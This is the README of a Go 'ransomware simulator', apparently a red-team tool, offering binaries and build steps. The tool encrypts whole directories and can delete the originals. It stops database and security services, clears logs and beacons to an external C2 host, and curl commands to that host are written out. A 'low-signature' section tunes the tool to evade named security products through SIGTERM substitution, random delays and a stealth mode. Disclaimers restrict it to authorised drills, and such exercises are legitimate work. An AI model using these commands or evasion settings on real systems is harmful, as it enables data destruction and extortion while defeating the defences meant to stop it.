# 勒索软件模拟器 (Ransomware Simulator)

  [![Go](https://img.shields.io/badge/Go-1.24+-00ADD8?style=flat&logo=go)](https://golang.org) [![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT) ![Cloudflare Workers](https://img.shields.io/badge/Cloudflare-Workers-F38020?logo=cloudflare&logoColor=white) ![Version](https://img.shields.io/badge/Version-v3.4-blue.svg)

  > **安全警告**：本工具仅用于网络安全培训和防御研究。禁止用于非法用途。使用前请确保在隔离环境中运行！
  >
  > v3.2 密钥接口已迁移至 Cloudflare Workers + D1 数据库，参考 [yangzifun/ransom_simulator: 模拟勒索病毒](https://github.com/yangzifun/ransom_simulator)

  

  ## 🚀 项目概述

  这是一个用于红队演练和防御研究的勒索软件模拟器，模拟真实勒索软件的行为模式，包括文件加密、勒索信生成、C2通信等关键攻击链环节。项目遵循MIT许可证，旨在帮助安全团队测试防御方案和进行安全意识培训。

  ## ✨ 主要功能

  ### 🔒 核心功能
  - **文件加密系统**：使用RSA-2048 + AES-256混合加密
  - **多平台支持**：Windows/Linux/macOS 全平台兼容
  - **并发加密处理**：多worker线程优化性能
  - **密钥获取**：API优先获取密钥，失败自动回退本地公钥文件

  ### 📜 勒索系统
  - **多语言勒索信**：中/英文双语勒索模板
  - **智能投放机制**：每个加密目录自动投放勒索信
  - **壁纸修改模拟**：尝试修改系统壁纸增加影响

  ### 🛡️ 攻击链模拟
  - **服务停止攻击**：停止数据库、安全软件服务
  - **内存清理技术**：清理数据库缓存、系统内存
  - **进程守护解除**：停止守护进程和定时任务
  - **数据库攻击**：针对企业数据库的专项攻击

  ### 🔗 C2 通信
  - **Beacon 心跳**：通过 Cloudflare Worker 发送加密状态心跳
  - **密钥远程下发**：通过 Workers API 获取 RSA 密钥对
  - **状态上报**：加密完成后上报统计信息

  ### 📊 日志与审计
  - **详细日志记录**：成功/失败文件分别记录
  - **操作过程追踪**：完整记录程序执行流程
  - **日志自动分类**：按程序目录输出日志文件



  ## 🚀 安装与使用

  ### 预编译二进制

  从 [Releases页面](https://github.com/yangzifun/ransom_simulator/releases) 下载对应平台的二进制文件：

  ```bash
  # Windows
  ransom_simulator.exe [参数]
  # Linux
  ./ransom_simulator_linux [参数]
  ```

  ### 从源码编译

  #### 编译步骤

| **目标平台**        | **命令**                                                     | **输出文件**                                             |
| ------------------- | ------------------------------------------------------------ | -------------------------------------------------------- |
| **Linux（64位）**   | `GOOS=linux GOARCH=amd64 go build -o ransom_simulator_linux ./ransom_simulator_linux.go`<br/>`CGO_ENABLED=0 go build -o ransom_simulator_linux_static ./ransom_simulator_linux.go` | ransom_simulator_linux<br/>ransom_simulator_linux_static |
| **Windows（64位）** | `GOOS=windows GOARCH=amd64 go build -o ransom_simulator.exe ./ransom_simulator_windows.go` | ransom_simulator.exe                                     |
| **macOS（Intel）**  | `GOOS=darwin GOARCH=amd64 go build -o ransom_simulator_macos ./ransom_simulator_linux.go` | ransom_simulator_macos                                   |

  #### 编译解密工具

  ```bash
  go build -o decryptor ./ransom_simulator/decryptor.go
  ```

  > **提示**：Linux/macOS 版本共享同一套源码（`ransom_simulator/Linux/ransom_simulator_linux.go`），但开启的平台特定功能有所不同。

  ### 基本使用

  ```bash
  # 演习模式（不实际加密文件）
  ./ransom_simulator_linux -dry-run
  # 启用日志功能
  ./ransom_simulator_linux -log -dry-run
  # 指定工作线程数
  ./ransom_simulator_linux -workers=8 -log
  # 加密特定目录并启用日志
  ./ransom_simulator_linux -dir="/path/to/target" -log
  # 加密后删除原文件（危险！）
  ./ransom_simulator_linux -remove -log
  ```

  ## ⚙️ 命令行参数详解

  | 参数               | 类型   | 描述                                | Windows | Linux | macOS | 默认值       | 备注                             |
  | ------------------ | ------ | ----------------------------------- | ------- | ----- | ----- | ------------ | -------------------------------- |
  | -dir               | string | 指定攻击目标（目录或文件）          | ✅       | ✅     | ✅     | 系统根目录   | 逗号分隔多个目录                 |
  | -ext               | string | 指定要加密的文件扩展名              | ✅       | ✅     | ✅     | 预定义扩展名 | 如：.txt,.pdf,.docx              |
  | -workers           | int    | 并发Worker线程数量                  | ✅       | ✅     | ✅     | CPU核心数    | 建议根据系统资源调整             |
  | -dry-run           | bool   | 演习模式，不实际加密                | ✅       | ✅     | ✅     | false        | 用于测试和演示                   |
  | -remove            | bool   | 加密后删除原文件                    | ✅       | ✅     | ✅     | false        | 高危操作，谨慎使用               |
  | -log               | bool   | 启用日志功能                        | ✅       | ✅     | ✅     | false        | 日志文件输出到程序所在目录       |
  | --stealth          | bool   | 隐秘模式，完全跳过阶段2破坏性操作   | ❌       | ✅     | ✅     | false        | 仅执行文件加密，不触碰系统进程   |
  | --no-stop-services | bool   | 跳过停止数据库和安全服务            | ❌       | ✅     | ✅     | false        | 降低安全软件告警风险             |
  | --no-kill-procs    | bool   | 跳过终止进程操作                    | ❌       | ✅     | ✅     | false        | 避免 process kill 行为特征       |
  | --no-clear-logs    | bool   | 跳过清除日志操作                    | ❌       | ✅     | ✅     | false        | 避免日志清除行为触发告警         |
  | --aggressive-delay | int    | 各操作间随机延迟上限（毫秒）        | ❌       | ✅     | ✅     | 0            | 打乱行为时序，降低检测特征，0=不延迟 |

  ## 🔐 密钥管理

  程序采用 **API 优先获取密钥，失败回退本地密钥** 的策略。

  ### 1. 远程 API 模式（默认）

  程序启动时自动向以下接口请求 RSA 公钥：

  ```
  POST https://encrypt.yangzifun.org/E56dSY
  ```

  **请求响应示例：**
  ```json
  {
      "status": "success",
      "uuid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
      "public_key_pem": "-----BEGIN PUBLIC KEY-----\n...",
      "private_key_pem": "-----BEGIN PRIVATE KEY-----\n..."
  }
  ```

  - 每次加密请求会生成**全新的 RSA 密钥对**，返回 UUID 和 PEM 格式密钥
  - 私钥仅此一份，**请务必妥善保存 UUID**，用于后续解密
  - 密钥对存储在 Cloudflare D1 数据库的 `keys` 表中
  - 生成统计（总生成次数、最新UUID和时间）持久化在 `key_metrics` 表中，清理 `keys` 表不影响累计统计数据

  ### 2. 本地密钥模式（回退/离线）

  当 API 不可用时（网络断开、服务不可达），自动回退到本地公钥文件：

  **文件要求：**

  ```
  程序目录/
  ├── ransom_simulator_linux        # 可执行文件
  └── public_key_<uuid>.pem         # 公钥文件，例如：
      ├── public_key_5137d4c3-3901-4528-bfa9-6d9ce88fa287.pem
  ```

  **公钥文件格式：**
  ```
  -----BEGIN PUBLIC KEY-----
  MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAwL6+M4l4R/6mZRZz9cLr
  ...
  -----END PUBLIC KEY-----
  ```

  **UUID 自动提取：**
  - 程序自动从公钥文件名中提取 UUID
  - UUID 格式：`xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx`

  ### 3. Beacon 心跳

  加密完成后，程序向 C2 服务器发送 Beacon 心跳：

  ```
  GET/POST https://encrypt.yangzifun.org/beacon_check_in
  ```

  服务器记录来源 IP、User-Agent、时间戳等 IOC 信息。

  ## 🎯 使用场景示例

  ### 场景1：企业数据库攻击测试
  ```bash
  # 模拟对数据库服务器的攻击
  ./ransom_simulator_linux -log -dir="/var/lib/mysql,/opt/oracle" -workers=4
  # 效果：停止数据库服务、清理内存缓存、加密数据库文件
  ```

  ### 场景2：安全防御演练
  ```bash
  # 测试安全软件的防护能力
  ./ransom_simulator_linux -log -dry-run -ext=".conf,.key,.pem"
  # 效果：记录所有潜在攻击目标，不实际加密
  ```

  ### 场景3：日志审计测试
  ```bash
  # 测试日志系统的记录能力
  ./ransom_simulator_linux -log -workers=2 -ext=".log,.txt"
  # 效果：生成详细日志文件，便于事后分析
  ```

  ### 场景4：内部红队演练
  ```bash
  # 企业内部安全测试
  ./ransom_simulator_linux -log -workers=2 -ext=".sql,.db,.bak"
  # 日志文件便于事后分析和汇报
  ```

  ### 场景5：隐秘模式测试（v3.4 新增）
  ```bash
  # 完全跳过阶段2，仅执行文件加密，不触碰任何系统进程
  ./ransom_simulator_linux -log --stealth -dir="/tmp/test" -ext=".txt,.doc"
  # 效果：不调用 systemctl、不 kill 进程、不清理日志，最大限度降低安全软件告警
  ```

  ### 场景6：低特征模式测试（v3.4 新增）
  ```bash
  # 逐步放开阶段2操作，配合随机延迟打乱行为时序
  ./ransom_simulator_linux -log \
    --no-clear-logs --no-kill-procs \
    --aggressive-delay=3000 \
    -dir="/tmp/test"
  # 效果：跳过日志清除和进程终止，操作间随机延迟 0-3 秒，避免触发时序检测
  ```

  ## 🔧 技术细节

  ### 密钥获取策略

  1. **API 优先**：启动时通过 HTTPS 请求远程获取 RSA 公钥
  2. **自动回退**：API 失败（超时/网络不可达）时自动加载本地公钥文件
  3. **UUID 管理**：API 模式由服务端生成 UUID，本地模式从文件名自动提取
  4. **完全离线**：本地密钥模式无需网络连接，可在隔离环境中使用

  ### 攻击技术

  #### 1. 服务停止攻击
  - **数据库服务**：MySQL、PostgreSQL、MongoDB、Redis、Oracle
  - **安全软件**：阿里云安骑士、ClamAV、rkhunter、ossec
  - **监控工具**：Zabbix、Nagios、Cacti
  - **v3.4 低特征改进**：优先使用 SIGTERM 进程信号（`pgrep` + `kill`），`systemctl stop` 仅作为回退方案；移除 `systemctl disable`

  #### 2. 内存清理技术
  - **数据库缓存**：MySQL缓存刷新、PostgreSQL缓存清理
  - **系统内存**：页面缓存清理、目录项清理
  - **网络缓存**：ARP缓存、DNS缓存清理

  #### 3. 进程守护解除
  - **进程管理器**：supervisord、monit 等非系统级守护进程
  - **定时任务**：cron、atd
  - **v3.4 低特征改进**：移除对 `systemd`、`init`、`upstart`、`runit` 等系统级进程的 `pkill -9` 操作，仅对非系统级守护进程尝试 `systemctl stop`

  #### 4. 数据库链接解挂
  - **客户端进程**：mysql、psql、mongo、redis-cli（SIGTERM 信号）
  - **网络连接**：关闭数据库端口（3306、5432等）
  - **v3.4 低特征改进**：移除 `ss -K` 全网络连接关闭；`pkill -9` 改为 `pkill`（SIGTERM）

  ### 低特征模式（v3.4 新增）

  为降低安全软件（如阿里云安骑士、多维攻击识别引擎）的主动防御告警，v3.4 引入了低特征对抗机制：

  | 原行为（高特征） | v3.4 低特征替代 | 风险评估 |
  |---|---|---|
  | `systemctl stop postgresql` | `pgrep -x` → `kill <pid>`（SIGTERM） | systemctl 调用是强告警特征 |
  | `systemctl disable` 服务 | 已移除 | 修改开机启动项极易触发告警 |
  | `pkill -9 -f` 暴力杀进程 | `pkill -f`（SIGTERM，无 `-9`） | `-9` 信号是勒索软件典型特征 |
  | `pkill -9 systemd/init` | 已移除 | 系统级进程杀操作是最高危告警 |
  | `ss -K` 全网络连接关闭 | 已移除 | 大规模断网行为触发网络层检测 |
  | 固定延迟顺序执行 | `--aggressive-delay` 随机延迟 | 打乱时序特征，绕过时序检测 |

  **参数组合推荐：**

  | 场景 | 参数组合 | 安全等级 |
  |---|---|---|
  | 最大隐蔽 | `--stealth` | 🟢 最低风险 |
  | 隐藏进程/日志操作 | `--no-kill-procs --no-clear-logs` | 🟡 中等风险 |
  | 隐藏服务操作 | `--no-stop-services` | 🟡 中等风险 |
  | 时序混淆 | `--aggressive-delay=3000` | 🟢 增强隐蔽 |
  | 完整阶段2（默认） | 无额外参数 | 🔴 高风险 |

  ### 增强文件识别

  #### 支持格式：
  - **数据库文件**：`.ora`, `.dmp`, `.exp`, `.ibd`, `.frm`, `.wal`
  - **配置文件**：`.conf`, `.cfg`, `.yml`, `.yaml`, `.toml`
  - **备份文件**：`.backup`, `.old`, `.temp`, `.swp`
  - **虚拟化文件**：`.vmdk`, `.vhd`, `.qcow2`, `.dockerfile`
  - **密钥文件**：`.key`, `.pem`, `.crt`, `.cer`, `.pfx`

  ### 日志系统

  #### 日志文件结构：
  ```
  程序所在目录/
  ├── success_encrypted.log  # 成功加密的文件列表
  ├── failed_encrypted.log   # 加密失败的文件列表及错误信息
  └── operations.log         # 完整操作日志
  ```

  #### 日志内容示例：
  ```
  =================== 勒索软件模拟器日志 ===================
  程序版本: v3.2-Linux
  开始时间: 2024-01-15 14:30:25
  运行参数: ./ransom_simulator_linux -log -workers 4
  工作目录: /home/user/tools
  =========================================================

  [2024-01-15 14:30:26] 开始停止数据库服务
  [2024-01-15 14:30:27] 停止数据库服务完成
  [2024-01-15 14:30:28] 开始清理数据库内存和缓存
  [2024-01-15 14:30:28] 清理MySQL缓存
  [2024-01-15 14:30:29] SUCCESS: /var/lib/mysql/data.ibd -> /var/lib/mysql/data.ibd.encrypted
  [2024-01-15 14:30:29] FAILED: /etc/mysql/my.cnf - 权限不足
  [2024-01-15 14:30:30] 加密工作完成: 成功 148, 失败 4
  ```

  ## 🛡️ 安全测试场景

  ### 企业环境测试
  ```bash
  # 完整的企业攻击模拟
  ./ransom_simulator_linux -log \
    -dir="/var/lib/mysql,/opt/oracle,/home/project" \
    -workers=8 \
    -remove
  ```

  ### 防御演练
  ```bash
  # 测试防御系统的检测能力
  ./ransom_simulator_linux -log \
    -dry-run \
    -ext=".sql,.db,.conf" \
    -workers=4
  ```

  ### 日志审计测试
  ```bash
  # 测试日志系统的完整性
  ./ransom_simulator_linux -log \
    -workers=2 \
    -dir="/tmp/test_data"
  ```

  ## 🔍 模拟的关键攻击阶段 (MITRE ATT&CK®)

  | **Tactic (战术)** | **ID** | **新增模拟行为**                                             |
  | ----------------- | ------ | ------------------------------------------------------------ |
  | **防御规避**      | TA0005 | **服务停止攻击**：停止数据库和安全服务<br>**内存清理**：清理数据库缓存和系统内存<br>**进程守护解除**：停止守护进程和定时任务<br>**v3.4 低特征对抗**：SIGTERM 替代 SIGKILL、移除 systemctl disable、随机延迟打乱时序 |
  | **持久化**        | TA0003 | **增强互斥锁**：强制释放旧锁文件，自动重置状态               |
  | **发现**          | TA0007 | **增强文件识别**：支持数据库文件、配置文件、备份文件<br>**数据库发现**：自动扫描数据库数据目录 |
  | **横向移动**      | TA0008 | **数据库攻击**：终止数据库连接，解挂网络链接                 |
  | **影响**          | TA0040 | **增强加密目标**：针对企业关键资产的专项攻击<br>**详细日志记录**：完整攻击过程审计追踪 |

  ## 🔐 解密流程

  1. **保存 UUID**：加密时程序会输出 UUID，请务必保存

  2. **查询私钥**：访问 [加密密钥管理系统](https://encrypt.yangzifun.org/)
     - **密钥查询**：在页面左侧输入 UUID 查询对应的 RSA 私钥
     - **密钥生成**：在页面右侧点击"生成密钥"按钮，完成 Turnstile 人机验证后即可生成新的 RSA 密钥对
     - 下载私钥文件（PEM 格式），支持复制和下载
     - 页面顶部提供系统概况面板，展示累计生成总数和趋势图

  3. **使用解密工具**：
     ```bash
     # 编译解密工具
     go build -o decryptor ./ransom_simulator/decryptor.go
     
     # 解密单个文件
     ./decryptor -key=<UUID> -file=<加密文件.encrypted>
      
     # 批量解密目录
     ./decryptor -key=<UUID> -dir=<加密文件目录>
     ```

  ## 🔒 API 参考

  以下 API 由 `workers/_worker.js` 部署的 Cloudflare Worker 提供。

  #### GET/POST /beacon_check_in （C2 Beacon 接收）

  > 完整 URL：https://encrypt.yangzifun.org/beacon_check_in
  >
  > 支持任意 HTTP 方法，用于勒索模拟器的心跳检测。

  ```bash
  curl -X POST "https://encrypt.yangzifun.org/beacon_check_in"
  ```

  ```json
  {
      "status": "ok",
      "message": "Beacon acknowledged"
  }
  ```

  > 服务器会在日志中记录来源 IP、User-Agent、请求时间戳等 IOC 信息。无数据库依赖，仅记录日志。

  #### POST /E56dSY （密钥生成，安全路径）

  > 完整 URL：https://encrypt.yangzifun.org/E56dSY
  >
  > 安全路径接口，供勒索模拟器程序调用。默认路径为代码中硬编码的 `E56dSY`，可通过 `SECRET_PATH` 环境变量修改。

  ```bash
  curl -X POST https://encrypt.yangzifun.org/E56dSY \
    -H "Content-Type: application/json" \
    -d '{}'
  ```

  ```json
  {
      "status": "success",
      "message": "UUID 和 RSA 密钥对生成并保存成功。",
      "uuid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
      "public_key_pem": "-----BEGIN PUBLIC KEY-----\n...",
      "private_key_pem": "-----BEGIN PRIVATE KEY-----\n...",
      "public_key_jwk": { ... },
      "private_key_jwk": { ... }
  }
  ```

  #### POST /api/generate （密钥生成，Web UI）

  > 完整 URL：https://encrypt.yangzifun.org/api/generate
  >
  > Web UI 密钥生成接口，**需要 Turnstile 人机验证**。从浏览器页面中点击"生成密钥"按钮使用。

  **请求体：**
  ```json
  {
      "cf-turnstile-response": "xxx"
  }
  ```
  - `cf-turnstile-response`：Turnstile 人机验证 token（由浏览器端 Turnstile Widget 自动生成）

  **环境变量：**
  | 变量名 | 用途 |
  |--------|------|
  | `TURNSTILE_SITE_KEY` | 前端 Turnstile Widget 的 site key |
  | `TURNSTILE_SECRET_KEY` | 后端验证 Turnstile token 的 secret key |

  > 若未配置 Turnstile 环境变量，则跳过验证（可用于开发测试环境）。

  **响应：**
  ```json
  {
      "status": "success",
      "message": "UUID 和 RSA 密钥对生成并保存成功。",
      "uuid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
      "public_key_pem": "-----BEGIN PUBLIC KEY-----\n...",
      "private_key_pem": "-----BEGIN PRIVATE KEY-----\n...",
      "public_key_jwk": { ... },
      "private_key_jwk": { ... }
  }
  ```

  **验证失败响应：**
  ```json
  {
      "status": "error",
      "message": "人机验证失败，请重试"
  }
  ```

  #### GET /query?uuid=xxx （密钥查询）

  > 完整 URL：https://encrypt.yangzifun.org/query?uuid=xxx

  ```bash
  curl "https://encrypt.yangzifun.org/query?uuid=xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx"
  ```

  ```json
  {
      "status": "success",
      "uuid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
      "public_key": "-----BEGIN PUBLIC KEY-----\n...",
      "private_key": "-----BEGIN PRIVATE KEY-----\n..."
  }
  ```

  #### GET /stats?range=1m （统计数据）

  > 完整 URL：https://encrypt.yangzifun.org/stats?range=1m

  ```bash
  curl "https://encrypt.yangzifun.org/stats?range=1m"
  ```

  | 参数 | 可选值 | 说明 |
  |------|--------|------|
  | `range` | `1m`, `3m`, `6m`, `1y` | 统计时间范围（默认 1m） |
  | `total` | — | 累计生成总数，即使 `keys` 表被清理也不会重置 |

  ```json
  {
      "status": "success",
      "total": 676,
      "history": [
          { "date": "2025-05-01", "count": 5 },
          { "date": "2025-05-02", "count": 3 }
      ],
      "latest": {
          "uuid": "xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx",
          "created_at": "2025-05-26T12:34:56.000Z"
      },
      "range": "1m"
  }
  ```

  ### 重要注意事项

  - **UUID 和私钥：** UUID 是识别密钥的唯一凭证，私钥是解密文件的**唯一密钥**。**务必妥善保存！** 丢失私钥将导致文件永远无法解密。
  - **网络连接：** 加密过程需要访问 Cloudflare Worker API，请确保网络稳定。
  - **API 限制：** 脚本、程序及 API 服务会不定时更新，如遇执行错误，请从密钥查询页面更新程序。
  - **数据保存：** 本系统会定期清理 `keys` 表，如需保留密钥请尽快下载私钥文件。统计总数（总生成次数、最新记录等）独立存储在 `key_metrics` 表中，清理 `keys` 表不影响累计统计数据。
  - **重要声明：** **该站点提供的脚本仅用于演练防加密勒索，其他用途及使用过程中数据丢失与本服务无关！** 加密过程中源文件不会被自动清除。

  ## ⚠️ 免责声明

  **重要提醒**：本工具为**安全研究和培训专用**，严禁用于非法用途！

  ### 使用前必须确认：
  1. ✅ 仅在合法授权的环境中使用
  2. ✅ 获取系统所有者的明确授权
  3. ✅ 在隔离的测试环境中运行
  4. ✅ 备份所有重要数据

  ### 法律责任：
  - 开发者不对任何滥用行为负责
  - 使用者需承担全部法律责任
  - 违反法律规定的使用将面临法律制裁

  **真实勒索软件是严重犯罪行为！本工具仅用于教育和防御研究。**

  ## 📞 支持与贡献

  ### 问题反馈
  - GitHub Issues: [报告问题](https://github.com/yangzifun/ransom_simulator/issues)
  - 安全漏洞: 请通过GitHub私密报告

  ### 贡献指南
  1. Fork 项目仓库
  2. 创建功能分支
  3. 提交更改
  4. 推送分支
  5. 创建Pull Request

  ## 🔗 项目链接

  - **GitHub仓库**: https://github.com/yangzifun/ransom_simulator
  - **密钥管理系统**: https://encrypt.yangzifun.org/
  - **C2服务器**: Cloudflare Workers 实现（`workers/_worker.js`）
  - **文档**: 完整技术文档和使用指南

---

  **最后提醒**：网络安全是共同责任，使用本工具时请始终遵循道德和法律准则。让我们共同建设更安全的网络环境！